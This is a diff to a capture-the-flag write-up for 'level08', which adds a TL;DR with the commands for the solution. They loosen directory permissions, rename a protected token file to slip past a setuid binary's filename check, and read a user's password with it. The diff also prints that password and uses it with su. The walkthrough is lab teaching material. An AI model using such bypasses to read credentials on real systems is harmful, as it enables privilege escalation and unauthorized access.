@@ -8,6 +8,26 @@
 <br>
 
 
+## TL;DR:
+
+To get the `flag08` user password:
+```bash
+chmod 777 .
+mv token foobar
+./level08 foobar
+```
+
+With the password `quif5eloekouj29ke0vouxean`:
+```bash
+su flag08 -c getflag
+```
+
+<br>
+
+
+## Explanation:
+
+
 #### Step 1:
 
 - What's in the home directory:
@@ -64,7 +84,7 @@ mv token foobar
 ./level08 foobar
 ```
 
-> ```bash
+> ```
 > quif5eloekouj29ke0vouxean
 > ```
 > It worked! We got the password for the `flag08` user.
@@ -82,4 +102,4 @@ su flag08 -c getflag
 
 ---
 
-[<<](/level07/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; [>>](/level09/resources/Readme.md)
+[<<](/level07/resources/Readme.md) &nbsp; [[Back to main page]](/Readme.md) &nbsp; [>>](/level09/resources/Readme.md)
